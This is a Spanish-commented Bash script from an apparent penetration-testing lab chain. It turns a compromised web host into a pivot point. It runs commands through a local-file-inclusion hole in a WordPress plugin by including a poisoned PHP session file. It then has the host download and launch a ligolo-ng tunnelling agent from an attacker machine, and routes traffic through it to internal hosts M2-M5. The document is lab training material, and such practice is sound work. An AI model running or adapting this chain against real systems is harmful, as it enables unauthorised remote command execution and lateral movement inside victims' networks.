#!/usr/bin/env bash
# ============================================================================
#  lab/chain/01b-pivot.sh — convierte M1 en el trampolín de la cadena
# ----------------------------------------------------------------------------
#  Después de 01 (www-data en M1), sube el agente de ligolo-ng a M1 y monta el
#  túnel en M6. A partir de aquí el tráfico a M2-M5 sale por M1.
#
#  Requiere: 01 --run ejecutado (WS_SID en /tmp/lab-chain.env) y ligolo-ng
#  en artifacts/pocs/.
#
#  Uso:
#    bash lab/chain/01b-pivot.sh            # imprime y comprueba
#    bash lab/chain/01b-pivot.sh --run      # sube agente + arranca proxy
#    bash lab/chain/01b-pivot.sh --check    # solo verifica rutas
# ============================================================================

set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_REPO_DIR="${LAB_REPO_DIR:-$(cd "$HERE/../.." && pwd)}"
LAB_ARTIFACTS="${LAB_ARTIFACTS:-$LAB_REPO_DIR/artifacts}"
LAB_LOG="${LAB_LOG:-${TMPDIR:-/tmp}/lab-chain.log}"
export LAB_REPO_DIR LAB_ARTIFACTS LAB_LOG
. "$HERE/../common/lib.sh"
LAB_ROLE=chain

RUN=0
CHECK=0
WORK="${LAB_WORK:-${HOME:-/tmp}/lab-work}"
STATE="${LAB_STATE:-${TMPDIR:-/tmp}/lab-chain.env}"
LFI_PATH="${LFI_PATH:-/wp-content/plugins/legacy-download/dl.php}"
PROXY_PORT="${PROXY_PORT:-11601}"
IFACE_NAME="${IFACE_NAME:-lab}"
CFG="$WORK/ligolo.yaml"
PROXY_LOG="$WORK/ligolo-proxy.log"

while (($#)); do
  case "$1" in
    --run) RUN=1; shift ;;
    --check) CHECK=1; shift ;;
    -h|--help) echo "Uso: $0 [--run|--check]"; exit 0 ;;
    *) die "opción desconocida: $1" ;;
  esac
done

[[ -f "$STATE" ]] && . "$STATE"
WS_SID="${WS_SID:-}"
[[ -n "$WS_SID" ]] || die "falta WS_SID: corre 01-m1-php2shell.sh --run primero"

m1_exec() { # m1_exec <comando sh>
  curl -sk --max-time 30 -G "https://wp.uni.lab${LFI_PATH}" \
    --data-urlencode "file=../../../../../../../tmp/sess_${WS_SID}" \
    --data-urlencode "c=$1"
}

lab_banner
step "pivote · M1 (${M1}) como puerta hacia M2-M5"

if (( CHECK )); then
  step "estado del pivote"
  sysctl -n net.ipv4.ip_forward >/dev/null 2>&1 || true
  ip -brief addr show "$IFACE_NAME" 2>/dev/null || warn "interfaz $IFACE_NAME no existe"
  for h in "$M2" "$M3" "$M4" "$M5"; do
    r="$(ip route get "$h" 2>/dev/null | head -1 || true)"
    if grep -q "dev $IFACE_NAME" <<<"$r"; then ok "$h por $IFACE_NAME"; else warn "$h NO va por $IFACE_NAME: $r"; fi
  done
  exit 0
fi

cat <<EOF
Pasos:
  1. agente en M1 (como www-data): $WORK/agent -connect $M6:$PROXY_PORT -ignore-cert -retry
  2. proxy en M6 (root):            ligolo-proxy -selfcert -laddr 0.0.0.0:$PROXY_PORT -config $CFG
  3. rutas /32 por la interfaz $IFACE_NAME (no tocar .11 ni .20)
  4. verificar: ip route get $M2  ->  dev $IFACE_NAME
EOF

if (( RUN == 0 )); then
  step "modo impresión"
  printf '  Sin --run no se monta el túnel. Para montarlo: --run\n' >&2
  exit 0
fi

need_cmd curl
need_cmd ip
mkdir -p "$WORK"

step "datos de M1 (interfaz y MAC para el id del agente)"
mac="$(m1_exec "cat /sys/class/net/*/address 2>/dev/null | head -1" | tr -d ':\r\n' | tr 'A-Z' 'a-z')"
[[ -n "$mac" ]] || mac="labm1$(date +%s)"
ok "id de agente: $mac"

step "config de ligolo"
cat > "$CFG" <<EOF
agent:
    $mac:
        autobind: true
        interface: $IFACE_NAME
interface:
    $IFACE_NAME:
        routes:
            - $M2/32
            - $M3/32
            - $M4/32
            - $M5/32
web:
    enabled: false
EOF
ok "config: $CFG"

step "arrancando proxy en M6 (root)"
if pgrep -f 'ligolo.*proxy' >/dev/null 2>&1; then
  ok "proxy ya está corriendo"
else
  command -v ligolo-proxy >/dev/null 2>&1 || die "falta ligolo-proxy (extrae artifacts/pocs/ligolo-ng_proxy_*.tar.gz en /usr/local/bin)"
  setsid nohup ligolo-proxy -selfcert -laddr "0.0.0.0:$PROXY_PORT" -config "$CFG" \
    >"$PROXY_LOG" 2>&1 &
  sleep 2
  ok "proxy en :$PROXY_PORT (log: $PROXY_LOG)"
fi

step "subiendo y arrancando el agente en M1"
# Se descarga desde el espejo de M6 y se ejecuta como www-data.
cmd='cd /tmp && curl -fsS http://10.10.10.20:8000/artifacts/pocs/ligolo-ng_agent_0.9.2_linux_amd64.tar.gz -o a.tgz && tar xzf a.tgz && chmod +x agent && (setsid nohup ./agent -connect 10.10.10.20:11601 -ignore-cert -retry -id '"$mac"' >/tmp/agent.log 2>&1 &) && echo started'
m1_exec "$cmd" | tail -3

step "esperando rutas"
for i in $(seq 1 20); do
  if ip route get "$M2" 2>/dev/null | grep -q "dev $IFACE_NAME"; then
    ok "pivote activo: $M2 va por $IFACE_NAME"
    for h in "$M3" "$M4" "$M5"; do
      ip route get "$h" 2>/dev/null | grep -q "dev $IFACE_NAME" \
        && ok "$h por $IFACE_NAME" || warn "$h aún no enruta por $IFACE_NAME"
    done
    exit 0
  fi
  sleep 2
done

warn "las rutas no aparecieron. Abre el proxy y revisa:"
warn "  ligolo-proxy -selfcert -laddr 0.0.0.0:$PROXY_PORT -config $CFG"
warn "  dentro: session  →  tunnel_start  (o usa la WebUI en http://127.0.0.1:8080)"
warn "log del proxy: $PROXY_LOG"
exit 1
